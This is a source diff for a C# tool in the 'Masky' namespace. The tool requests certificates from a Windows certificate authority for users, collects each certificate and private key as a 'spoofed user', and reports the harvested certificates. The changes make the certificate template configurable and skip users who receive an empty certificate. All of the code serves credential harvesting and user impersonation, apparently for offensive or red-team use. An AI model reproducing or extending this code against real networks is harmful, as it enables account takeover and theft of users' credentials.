@@ -33,7 +33,7 @@ namespace Masky
         private string templateName = null;
         public List<SpoofedUser> spoofedUsers = new List<SpoofedUser>();
 
-        public Cert(string CA, string templateName = "User")
+        public Cert(string CA, string templateName)
         {
             this.CA = CA;
             this.templateName = templateName;
@@ -179,16 +179,15 @@ namespace Masky
 
 
 
-        private static CertificateRequest CreateCertRequestMessage()
+        private CertificateRequest CreateCertRequestMessage()
         {
-            string templateName = "User";
             string subjectName = "";
 
             try
             {
                 subjectName = GetCurrentUserDN();
             }
-            catch {}
+            catch { }
 
             var privateKey = CreatePrivateKey(false);
             var privateKeyBase64 = privateKey.Export("PRIVATEBLOB", EncodingType.XCN_CRYPT_STRING_BASE64);
@@ -200,7 +199,7 @@ namespace Masky
             objPkcs10.InitializeFromPrivateKey(context, privateKey, "");
 
             CX509ExtensionTemplateName objExtensionTemplate = new CX509ExtensionTemplateName();
-            objExtensionTemplate.InitializeEncode(templateName);
+            objExtensionTemplate.InitializeEncode(this.templateName);
             objPkcs10.X509Extensions.Add((CX509Extension)objExtensionTemplate);
 
             var objDN = new CX500DistinguishedName();
@@ -305,9 +304,15 @@ namespace Masky
 
             var certPemString = DownloadCert(CA, requestID);
 
-            spoofedUsers.Add(new SpoofedUser(Hostname, UserName, certPemString, csr.PrivateKeyPem));
-            Console.WriteLine("[+] Gathered certificate related to: {0}", UserName);
-
+            if (certPemString != "")
+            {
+                spoofedUsers.Add(new SpoofedUser(Hostname, UserName, certPemString, csr.PrivateKeyPem));
+                Console.WriteLine("[+] Gathered certificate related to: {0}", UserName);
+            }
+            else if (certPemString == "" && csr.PrivateKeyPem != "")
+            {
+                Console.Error.WriteLine("Empty Certificate for the user {0}", UserName);
+            }
             return;
         }
     }
